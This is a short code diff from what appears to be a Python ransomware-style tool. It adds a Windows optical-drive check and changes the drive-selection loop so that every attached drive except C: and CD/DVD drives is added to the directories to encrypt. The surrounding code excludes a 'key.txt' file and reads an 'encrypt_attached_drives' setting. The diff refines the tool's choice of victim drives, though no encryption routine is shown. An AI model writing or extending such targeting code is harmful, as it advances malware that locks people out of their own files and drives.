@@ -8,6 +8,7 @@
 import os
 import locale
 import win32api
+import win32file
 
 # Import classes
 
@@ -108,6 +109,18 @@ class Base():
     FILES_TO_EXCLUDE = [
         "key.txt"
         ]
+
+    def is_optical_drive(self, drive_letter):
+        '''
+        @summary: Checks if the specified drive letter is an optical drive
+        @param drive_letter: The letter of the drive to check
+        @return: True if drive is an optical drive, otherwise false
+        '''
+        
+        if win32file.GetDriveType('%s:' % drive_letter) == win32file.DRIVE_CDROM:
+            return True
+        else:
+            return False
     
 
     def get_base_dirs(self, home_dir, __config):
@@ -118,7 +131,8 @@ class Base():
       if __config["encrypt_attached_drives"] is True:
           attached_drives = win32api.GetLogicalDriveStrings().split('\000')[:-1]
           for drive in attached_drives:
-              if drive[0] != 'C':
+              drive_letter = drive[0]
+              if drive_letter != 'C' and not self.is_optical_drive(drive_letter):
                   base_dirs.append(drive)
       
       # Add C:\\ user space directories
